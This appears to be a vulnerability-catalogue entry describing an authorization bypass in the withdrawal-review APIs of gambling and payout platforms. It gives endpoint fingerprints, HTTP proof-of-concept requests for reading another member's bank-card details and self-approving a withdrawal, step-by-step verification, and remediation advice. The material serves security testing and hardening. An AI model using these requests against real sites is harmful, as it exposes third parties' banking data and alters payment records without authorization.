---
title: Withdrawal-review endpoint authorization bypass (read others' bank cards / change review status)
cve: None (business logic)
severity: critical
cvss: 9.1
product: Turnkey gambling platforms / money-mule payout processing
versions: Any
ports: 80, 443
keywords: withdrawal, withdraw, review, approve, bank card, authorization bypass
entry: Choose one of two forms (Query/JSON), based on captured requests
verified: false
sources: Compiled from public sources (business logic flaws; no CVE)
---

## Fingerprints

Two common forms appear in captured traffic (**a given site uses only one**; do not apply the Query form to a JSON-based site):

```
Query form:  /api/withdraw/list?status=pending&pageNo=1
             /api/withdraw/detail?id=100234
             /api/withdraw/approve?id=100234&state=approved
JSON form:   POST /api/withdraw/approve     {"id":100234,"state":"approved"}
             POST /api/admin/withdraw/audit {"orderNo":"...","result":"pass"}
Other:       /api/member/bank?uid=          /api/finance/order/confirm
```

Review endpoints are often hosted on the **same domain as the frontend** (`www.` or `m.`), relying only on hidden frontend menus.

## Prerequisites

- **Two** ordinary member accounts on the same site (A, B, both owned by you)—using only "your own old/canceled orders" as controls causes false positives: viewing your own orders does not prove an authorization bypass.
- Create one minimum-value withdrawal per account, obtaining an `id` for each.

## PoC

```http
### 0) Baseline: A's token reads A's order (expect 200)—examples for both forms; choose one based on captured requests
GET  /api/withdraw/detail?id=<A-order> HTTP/1.1
POST /api/withdraw/detail HTTP/1.1
{"id":<A-order>}

### 1) Unauthorized read: A's token reads B's order (the only reliable proof of unauthorized access)
GET  /api/withdraw/detail?id=<B-order> HTTP/1.1
POST /api/withdraw/detail HTTP/1.1
{"id":<B-order>}

### 2) Missing role checks on approval: A's token approves A's own order (choose Query or JSON)
POST /api/withdraw/approve?id=<A-order>&state=approved HTTP/1.1
POST /api/withdraw/approve HTTP/1.1
Content-Type: application/json
{"id":<A-order>,"state":"approved"}
```

## Exploitation Steps

1. A and B each request a minimum-value withdrawal; record both `id` values and initial statuses (pending).
2. Perform step 1: B's name/card number/bank returned ⇒ unauthorized read confirmed (the **primary evidence** of an authorization bypass).
3. Perform step 2: 2xx response and A's order changes pending → approved ⇒ missing role check on approval (use only A's own order).
4. Read back `detail`/`list` to confirm the status was persisted, not merely a success response; absence of a review entry point in the member UI is only supporting evidence, not primary proof.
5. **Boundary**: self-approval ≠ funds can leave. Actual payout depends on secondary review, payout risk controls, and channel reconciliation—this material does not cover those; mark them "unverified" in the report.
6. Evidence: one response from A reading B (redacted) + before/after status of A's self-approval; void test orders and record their numbers.

## Remediation and Mitigation (Hardening)

- Separate management domain for review endpoints + strict role checks (finance role) + two-level approval + idempotency (one status transition per order).
- Filter lists/details by `uid` with row-level authorization; return only the last four bank-card digits.
- Audit every status change (operator, IP, time, previous/new status).

## References

- OWASP API Security Top 10: API5 BFLA; OWASP WSTG-BUSL-01.
